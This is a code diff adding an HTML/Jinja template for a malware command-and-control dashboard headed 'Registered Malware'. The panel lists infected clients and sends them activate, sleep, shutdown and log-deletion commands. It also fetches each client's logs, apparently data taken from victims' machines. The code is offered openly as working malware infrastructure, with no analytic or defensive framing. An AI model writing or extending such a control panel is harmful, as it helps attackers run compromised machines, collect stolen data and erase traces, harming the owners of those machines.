@@ -1,0 +1,36 @@
+<h1>Registered Malware</h1>
+
+{% for uid, status in clients.items() %}
+    <div>
+        <h2>{{ uid }} - {{ status }}</h2>
+        {% if status != 'active' %}
+            <button class="command" data-command="activate" data-id="{{ uid }}">Activate</button>
+        {% endif %}
+        <button class="command" data-command="sleep" data-id="{{ uid }}">Sleep</button>
+        <button class="command" data-command="shutdown" data-id="{{ uid }}">Shutdown</button>
+        <button class="command" data-command="delete" data-id="{{ uid }}">Delete logs</button>
+        <button onclick="fetchLogs('{{ uid }}')">Fetch Logs</button>
+        <div id="log_output_{{ uid }}"></div>
+    </div>
+{% endfor %}
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+    function fetchLogs(uid) {
+        fetch('/getlogs?uid=' + uid)
+        .then(response => response.text())
+        .then(data => {
+            document.getElementById("log_output_" + uid).innerText = data;
+        });
+    }
+
+    $('.command').click(function() {
+        var command = $(this).data('command');
+        var id = $(this).data('id');
+
+        $.post('/' + command, { unique_id: id }, function(response) {
+            alert(response);
+        });
+    });
+</script>
+
